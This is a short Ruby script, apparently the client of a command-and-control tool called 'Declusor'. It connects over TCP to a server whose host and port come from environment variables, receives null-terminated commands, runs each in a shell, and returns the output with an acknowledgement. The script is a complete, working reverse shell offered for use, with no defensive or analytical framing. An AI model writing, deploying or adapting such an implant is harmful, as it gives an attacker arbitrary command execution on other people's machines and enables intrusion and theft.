#!/usr/bin/env ruby
# -----------------------------------------------------------------------------
# Declusor Ruby Client
# Connects to a C2 server, reads null-terminated commands, executes them,
# and returns the output.
# -----------------------------------------------------------------------------

require 'socket'

# Configuration
HOST = ENV['HOST'] || '127.0.0.1'
PORT = (ENV['PORT'] || 4444).to_i
ACKNOWLEDGE = ENV['ACKNOWLEDGE'] || 'ACK'

begin
    s = TCPSocket.new(HOST, PORT)
    
    # Read from socket using null byte as separator
    while (cmd = s.gets("\0"))
        # Remove the null byte separator
        cmd = cmd.chomp("\0")
        
        unless cmd.empty?
            begin
                # Execute command and capture stdout and stderr
                # IO.popen allows us to capture both
                output = IO.popen("#{cmd} 2>&1") { |io| io.read }
            rescue Exception => e
                output = e.message
            end
            
            # Send output
            s.write(output)
            
            # Send ACK
            s.write(ACKNOWLEDGE)
        end
    end
    
    s.close
rescue Exception
    exit 1
end
